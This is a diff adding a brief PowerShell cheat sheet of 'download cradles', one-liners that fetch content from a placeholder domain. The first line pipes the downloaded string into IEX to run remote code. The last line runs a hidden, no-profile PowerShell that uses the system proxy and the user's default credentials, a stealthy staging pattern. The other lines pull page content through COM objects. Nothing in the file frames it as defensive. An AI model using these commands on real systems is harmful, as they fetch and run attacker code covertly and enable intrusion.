@@ -1,0 +1,15 @@
+# download a string
+powershell "IEX(New-Object Net.WebClient).downloadString('https://<domain>')"
+# or
+$str=(New-Object Net.WebClient).DownloadData('https://<domain>'); [System.Text.Encoding]::UTF8.GetString($str)
+# or
+iwr 'https://<domain>'
+
+# download HTML source code
+$ie=New-Object -ComObject InternetExplorer.Application; $ie.visible=$False; $ie.navigate('https://<domain>'); sleep 5; $response=$ie.Document.body.innerHTML; $ie.quit(); echo $response
+# or 
+$h=New-Object -ComObject Msxml2.XMLHTTP; $h.open('GET','https://<domain>',$false); $h.send(); echo $h.responseText
+
+# download string using default proxy settings
+powershell.exe -nop -w hidden -c $t=new-object net.webclient; $t.proxy=[Net.WebRequest]::GetSystemWebProxy(); $t.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials; $t.downloadstring('https://<domain>')
+
